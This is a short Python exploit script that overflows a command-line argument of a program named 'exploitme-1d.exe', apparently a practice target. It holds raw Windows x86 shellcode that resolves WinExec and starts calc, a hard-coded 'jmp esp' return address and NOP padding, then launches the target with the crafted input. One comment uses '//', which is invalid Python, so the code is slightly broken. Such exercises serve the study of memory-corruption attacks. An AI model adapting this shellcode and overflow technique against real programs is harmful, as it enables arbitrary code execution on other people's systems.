import struct, subprocess

p = lambda x: struct.pack("<I", x)

execalc =  "\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52"
execalc += "\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E"
execalc += "\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C"
execalc += "\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F"
execalc += "\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7\x90"

arg1  = "A"*3 + "\x4a"
arg1 += "A"*40
arg1 += p(0x75e5f7df) // jmp esp
arg1 += execalc
arg1 += '\x90'*(0xff - len(arg1))

arg2 = "A"*3 + "\x4a"*3

s = subprocess.Popen(["exploitme-1d.exe",arg1, arg2])
